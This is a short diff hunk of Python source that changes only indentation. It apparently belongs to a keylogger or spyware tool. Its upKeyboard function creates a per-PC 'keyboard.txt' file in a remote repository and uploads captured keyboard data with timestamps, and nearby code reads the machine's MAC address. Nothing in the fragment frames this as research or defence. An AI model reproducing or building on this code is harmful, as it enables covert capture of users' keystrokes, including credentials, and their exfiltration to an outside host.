@@ -31,12 +31,12 @@ def network():
         return str(interface.MACAddress).replace(":","-")
 
 def upKeyboard(rep,msg,pcname):
-	if rep.contents("data/"+pcname+"/keyboard.txt") == None :
-	#	print "ip"
-		rep.create_file("data/"+pcname+"/keyboard.txt",pcname +" keyboard autosave file create",msg)
-	con = rep.contents("data/"+pcname+"/keyboard.txt")
-	d,t = fileOperation.getLocalTime()
-	upFile(con,msg,"upload keyboard "+d+" "+t)
+    if rep.contents("data/"+pcname+"/keyboard.txt") == None :
+#	print "ip"
+        rep.create_file("data/"+pcname+"/keyboard.txt",pcname +" keyboard autosave file create",msg)
+    con = rep.contents("data/"+pcname+"/keyboard.txt")
+    d,t = fileOperation.getLocalTime()
+    upFile(con,msg,"upload keyboard "+d+" "+t)
 
 
 def get_current_process():
